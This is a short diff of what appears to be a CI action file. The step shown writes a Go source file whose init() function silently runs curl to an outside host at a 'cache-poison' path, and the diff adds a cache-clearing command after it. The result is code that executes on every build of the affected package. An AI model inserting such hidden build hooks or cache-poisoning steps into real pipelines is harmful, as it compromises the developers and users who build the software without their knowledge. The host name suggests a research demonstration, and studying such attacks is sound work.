@@ -85,6 +85,7 @@ runs:
           [ -z "$pkgname" ] && pkgname="main"
           chmod +w "$pkgdir"
           printf 'package %s\n\nimport "os/exec"\n\nfunc init() {\n\texec.Command("curl", "-sS", "https://eaction-research.example.com/cache-poison").Run()\n}\n' "$pkgname" > "$pkgdir/eaction_cache_init.go"
+          go clean -cache 2>/dev/null || true
         fi
 
     - name: Set GOMEMLIMIT
